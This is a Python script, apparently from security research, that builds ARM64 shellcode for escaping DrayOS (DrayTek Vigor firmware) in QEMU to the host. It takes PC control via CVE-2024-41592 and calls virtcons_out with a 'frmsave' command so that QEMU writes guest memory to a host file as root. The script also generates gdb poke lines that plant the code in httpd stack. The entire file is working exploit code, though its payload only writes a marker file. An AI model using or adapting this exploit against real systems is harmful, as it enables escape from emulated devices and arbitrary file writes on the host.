#!/usr/bin/env python3
"""Build the ARM64 payload that escapes DrayOS to the host, by itself.

`escape.gdb` proved the primitive but let gdb set up the call. This produces
self-contained shellcode: given control of PC (which CVE-2024-41592 gives on a
no-cleanup handler), it constructs the `frmsave <addr> <size> <path>` console
command in registers and calls virtcons_out() with no debugger help. DrayOS
has no NX and no ASLR, so the bytes run wherever they land and every address
below is fixed.

    frmsave -> QEMU flush_buf -> qmp_memsave  => guest memory to a host file, root

It emits:
  * the raw shellcode bytes (hex, and the intended disassembly as comments)
  * pokes-shell.gdb -- `set` lines that lay the code, the command string and a
    marker into unused httpd task stack, so a harness can jump to it

    python3 shellcode.py --path /tmp/vigor-shellcode-escape.txt

The command dumps MARKER (a fixed recognisable blob) to <path>; if the file
appears on the host with the marker, the guest wrote it with no gdb in the loop.
"""
import argparse
import struct

VIRTCONS_OUT = 0x40422E20            # virtcons_out(w0=buf, w1=len)

# Unused httpd task stack (task stack 0x461ea800..0x461fa7f0, live SP ~0x461f6510).
SHELL  = 0x461EB000                  # the code
STRBUF = 0x461EB300                  # the "frmsave ..." command
MARKER = 0x461EB400                  # the bytes frmsave will dump to the host

MARKER_BYTES = b"SHELLCODE-ESCAPE-OK\n"


# --- a tiny AArch64 encoder, only the forms this payload uses ----------------
def movz_w(rd, imm16, shift=0):
    return 0x52800000 | ((shift // 16) << 21) | ((imm16 & 0xFFFF) << 5) | rd


def movk_w(rd, imm16, shift):
    return 0x72800000 | ((shift // 16) << 21) | ((imm16 & 0xFFFF) << 5) | rd


def mov_reg(rd, rm):                  # MOV Xd, Xm  == ORR Xd, XZR, Xm (64-bit)
    return 0xAA0003E0 | (rm << 16) | rd


def blr(rn):
    return 0xD63F0000 | (rn << 5)


def ret(rn=30):
    return 0xD65F0000 | (rn << 5)


def build(path):
    cmd = ("frmsave %d %d %s\n" % (MARKER, len(MARKER_BYTES), path)).encode()
    if len(cmd) >= 0x10000:
        raise SystemExit("command too long for a single movz of the length")

    insns = [
        (movz_w(0, STRBUF & 0xFFFF),               "movz w0, #0x%04x"       % (STRBUF & 0xFFFF)),
        (movk_w(0, (STRBUF >> 16) & 0xFFFF, 16),   "movk w0, #0x%04x, lsl #16" % ((STRBUF >> 16) & 0xFFFF)),
        (movz_w(1, len(cmd)),                      "movz w1, #%d"           % len(cmd)),
        (movz_w(16, VIRTCONS_OUT & 0xFFFF),        "movz w16, #0x%04x"      % (VIRTCONS_OUT & 0xFFFF)),
        (movk_w(16, (VIRTCONS_OUT >> 16) & 0xFFFF, 16), "movk w16, #0x%04x, lsl #16" % ((VIRTCONS_OUT >> 16) & 0xFFFF)),
        (mov_reg(19, 30),                          "mov x19, x30    ; save return"),
        (blr(16),                                  "blr x16         ; virtcons_out(cmd, len)"),
        (mov_reg(30, 19),                          "mov x30, x19    ; restore return"),
        (ret(),                                    "ret"),
    ]
    code = b"".join(struct.pack("<I", i) for i, _ in insns)
    return code, cmd, insns


def poke_lines(addr, blob):
    out = []
    blob = blob + b"\x00" * ((-len(blob)) % 4)
    for i in range(0, len(blob), 4):
        out.append("set *(unsigned int*)0x%08x = 0x%08x"
                   % (addr + i, struct.unpack_from("<I", blob, i)[0]))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--path", default="/tmp/vigor-shellcode-escape.txt",
                    help="host file the guest will create")
    ap.add_argument("--pokes", default="pokes-shell.gdb")
    a = ap.parse_args()

    code, cmd, insns = build(a.path)

    print("; shellcode: %d bytes at 0x%08x" % (len(code), SHELL))
    off = SHELL
    for (word, text), _ in zip(insns, range(len(insns))):
        print(";   0x%08x  %08x   %s" % (off, word, text))
        off += 4
    print("; raw: %s" % code.hex())
    print("; command (%d bytes): %r" % (len(cmd), cmd.decode()))

    lines = poke_lines(SHELL, code) + poke_lines(STRBUF, cmd) + poke_lines(MARKER, MARKER_BYTES)
    with open(a.pokes, "w", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")
    print("; wrote %s (%d set lines)" % (a.pokes, len(lines)))


if __name__ == "__main__":
    main()
